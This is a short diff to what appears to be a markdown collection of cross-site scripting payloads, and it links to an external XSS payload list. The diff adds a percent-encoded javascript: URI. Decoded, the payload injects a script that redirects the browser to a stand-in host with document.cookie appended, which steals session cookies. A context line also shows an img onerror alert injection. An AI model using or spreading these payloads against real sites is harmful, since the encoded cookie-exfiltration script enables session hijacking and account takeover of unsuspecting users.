@@ -120,6 +120,9 @@ y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(1337)%3E
 ```html
 <img src="https://i.imgflip.com/8uo0t9.jpg">
 ```
+```javascript
+javascript:decodeURIComponent('%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%60%68%74%74%70%73%3a%2f%2f%65%78%61%6d%70%6c%65%2e%63%6f%6d%3f%70%61%72%61%6d%3d%60%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73%63%72%69%70%74%3e')//
+```
 
 **External Sources for Payloads**
 - [XSS Payload List](https://github.com/payloadbox/xss-payload-list)
